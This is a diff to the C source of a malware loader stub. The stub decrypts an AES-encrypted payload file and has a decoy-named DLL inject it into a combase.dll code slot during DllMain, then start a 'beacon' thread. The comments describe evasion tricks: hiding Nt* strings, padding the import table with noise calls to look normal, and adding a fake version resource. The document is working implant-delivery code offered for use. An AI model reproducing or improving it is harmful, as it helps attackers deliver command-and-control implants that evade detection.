@@ -2,8 +2,11 @@
  * launcher.c — three-file Crystal Palace PICO loader (launcher stub)
  *
  * Delivery: launcher.exe + csvhelper.dll + payload.dat
- *   launcher.exe   this stub — decrypts payload.dat, hands plaintext to
- *                  csvhelper.dll's PluginRun export
+ *   launcher.exe   this stub — decrypts payload.dat, exposes plaintext to
+ *                  csvhelper.dll via the GetPayload export; csvhelper's
+ *                  DllMain drives the slot flip synchronously during
+ *                  LoadLibraryA and hands its thread handle back through
+ *                  SetThreadHandle.
  *   csvhelper.dll  combase!CoUninitialize slot loader (see plugin.c)
  *   payload.dat    AES-256-CBC encrypted PICO
  *
@@ -15,6 +18,11 @@
  *  - No Nt* strings in .rdata — no GetProcAddress / NtCreateSection pattern
  *  - BCryptGenRandom Poseidon noise + advapi32 import = normal-looking IAT
  *  - GUI subsystem (no console), version info resource (resource.rc)
+ *  - Module initialization runs inside csvhelper's DllMain: from the caller
+ *    thread's POV LoadLibraryA does the work synchronously, no post-load
+ *    exported "run" call needed. combase.dll is pre-loaded before csvhelper
+ *    so the plugin's DllMain can resolve it with GetModuleHandleW alone,
+ *    keeping LoadLibrary out of the loader-lock critical section.
  *
  * IAT: kernel32, advapi32, bcrypt. Slot-flip primitives (VirtualProtect,
  * CreateThread) live in the plugin, keeping this stub's IAT purely
@@ -36,7 +44,22 @@
 #  define PLUGIN_NAME "csvhelper.dll"
 #endif
 
-typedef HANDLE (WINAPI *plugin_run_fn)(const void *, SIZE_T);
+/* ── Statics the plugin retrieves via GetProcAddress ─────────────────────── */
+
+static BYTE  *s_payload_ptr = NULL;
+static SIZE_T s_payload_len = 0;
+static HANDLE s_thread      = NULL;
+
+__declspec(dllexport) void GetPayload(void **out_ptr, SIZE_T *out_len)
+{
+    if (out_ptr) *out_ptr = s_payload_ptr;
+    if (out_len) *out_len = s_payload_len;
+}
+
+__declspec(dllexport) void SetThreadHandle(HANDLE h)
+{
+    s_thread = h;
+}
 
 /* ── Poseidon I/O noise ───────────────────────────────────────────────────── */
 
@@ -160,6 +183,11 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     LocalFree(ct);
     if (!pt) return 1;
 
+    /* Stash plaintext in launcher statics: LoadLibraryA below fires the
+     * plugin's DllMain, which retrieves these via the GetPayload export. */
+    s_payload_ptr = pt;
+    s_payload_len = pt_len;
+
     /* Resolve absolute sibling path to the plugin DLL — passing a bare
      * filename to LoadLibrary would honour the DLL search order. */
     char pluginPath[MAX_PATH];
@@ -172,16 +200,24 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     }
     strcat(pluginPath, PLUGIN_NAME);
 
+    /* Pre-load combase so the plugin's DllMain can reach it with a plain
+     * GetModuleHandleW — calling LoadLibrary inside DllMain would recurse
+     * into the loader lock we're already holding. */
+    LoadLibraryA("combase.dll");
+
+    /* Loading csvhelper fires its DllMain synchronously. DllMain calls
+     * GetPayload, does the slot flip, CreateThreads the beacon, and hands
+     * the thread handle back through SetThreadHandle. When LoadLibraryA
+     * returns, the work is done. */
     HMODULE plugin = LoadLibraryA(pluginPath);
     if (!plugin) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
 
-    plugin_run_fn PluginRun =
-        (plugin_run_fn)GetProcAddress(plugin, "PluginRun");
-    if (!PluginRun) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
+    /* Plugin signalled success by handing us a thread handle. */
+    HANDLE hThread = s_thread;
 
-    /* PluginRun copies pt → combase slot before returning, so the plaintext
-     * lifetime ends exactly at the call boundary. Zero + free only after. */
-    HANDLE hThread = PluginRun(pt, pt_len);
+    /* Plaintext copied into combase's slot inside DllMain — safe to wipe. */
+    s_payload_ptr = NULL;
+    s_payload_len = 0;
     SecureZeroMemory(pt, pt_len);
     LocalFree(pt);
 
